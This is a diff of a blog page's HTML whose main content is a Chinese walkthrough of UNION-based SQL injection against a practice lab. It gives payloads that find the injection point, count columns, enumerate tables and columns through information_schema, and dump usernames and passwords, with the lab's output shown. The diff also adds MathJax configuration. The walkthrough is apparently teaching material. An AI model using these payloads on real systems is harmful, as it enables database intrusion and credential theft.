@@ -85,7 +85,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">451</span>
+            <span class="post-count">449</span>
         </span>
     </span>
 
@@ -119,30 +119,20 @@
 <p><code>id=1&#39;) -- -</code></p>
 <p>发现正常返回<code>id=1</code>的用户数据。</p>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Your</span> <span class="string">Login</span> <span class="string">name:Dumb</span></span><br><span class="line"><span class="string">Your</span> <span class="string">Password:Dumb</span></span><br></pre></td></tr></table></figure>
-
 <p>输入： <code>id=1&#39;) and 1=2 -- -</code> 发现没有查询结果，说明存在注入点。</p>
-<p>于是便开始注入，先通过<code>order by</code>看看有多少列</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#order by 数字 理解为按第几列的属性排序</span><br></pre></td></tr></table></figure>
-
-<p>输入 <code>id=1&#39;) order by 5 -- -</code>,得到报错<code> Unknown column &#39;5&#39; in &#39;order clause&#39;</code> 说明不存在第五列，通过二分法查找，最终确定一共有3列。</p>
-<p>然后再判断回显位 <code>id=-1&#39;) union select 1,2,3 -- -</code> </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#id=-1为了让他查询不到结果不显示，看union select后前端反馈的是哪两个数据。</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
-
-<p>说明回显位在2，3。于是我们对这两个位置进行注入来获得信息。<br>爆库名<br><code>id=-1&#39;) union select 1,database(),3 -- -</code></p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Your</span> <span class="string">Login</span> <span class="string">name:security</span></span><br><span class="line"><span class="string">Your</span> <span class="string">Password:3</span></span><br></pre></td></tr></table></figure>
-<p>可以知道库名为<code>security</code> </p>
+<p>于是便开始注入，先通过<code>order by</code>看看有多少列<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#order by 数字 理解为按第几列的属性排序</span><br></pre></td></tr></table></figure></p>
+<p>输入 <code>id=1&#39;) order by 5 -- -</code>,得到报错<code>Unknown column &#39;5&#39; in &#39;order clause&#39;</code> 说明不存在第五列，通过二分法查找，最终确定一共有3列。</p>
+<p>然后再判断回显位 <code>id=-1&#39;) union select 1,2,3 -- -</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#id=-1为了让他查询不到结果不显示，看union select后前端反馈的是哪两个数据。</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure></p>
+<p>说明回显位在2，3。于是我们对这两个位置进行注入来获得信息。<br>爆库名<br><code>id=-1&#39;) union select 1,database(),3 -- -</code><br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Your</span> <span class="string">Login</span> <span class="string">name:security</span></span><br><span class="line"><span class="string">Your</span> <span class="string">Password:3</span></span><br></pre></td></tr></table></figure><br>可以知道库名为<code>security</code> </p>
 <p>然后再根据库名去爆出表名。</p>
 <p><code>id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; -- -</code></p>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Your</span> <span class="string">Login</span> <span class="string">name:emails,referers,uagents,users</span></span><br><span class="line"><span class="string">Your</span> <span class="string">Password:3</span></span><br></pre></td></tr></table></figure>
-
 <p>同理再爆列名</p>
 <p><code>id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; -- -</code></p>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Your</span> <span class="string">Login</span> <span class="string">name:id,username,password</span></span><br><span class="line"><span class="string">Your</span> <span class="string">Password:3</span></span><br></pre></td></tr></table></figure>
 <p><strong>最后查询数据</strong></p>
 <p><code>id=-1&#39;) union select 1,group_concat(username),group_concat(password) from users order by id -- -</code></p>
-<p><strong>结果</strong></p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Your Login name:</span></span><br><span class="line"><span class="string">Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span></span><br><span class="line"><span class="attr">Your Password:</span></span><br><span class="line"><span class="string">Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span></span><br></pre></td></tr></table></figure>
-
+<p><strong>结果</strong><br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Your Login name:</span></span><br><span class="line"><span class="string">Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span></span><br><span class="line"><span class="attr">Your Password:</span></span><br><span class="line"><span class="string">Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span></span><br></pre></td></tr></table></figure></p>
  
       <!-- reward -->
       
@@ -467,6 +457,29 @@
     viewer_init()
 </script> 
 <!-- MathJax -->
+ <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true,
+  };
+</script>
 
 <!-- Katex -->
 
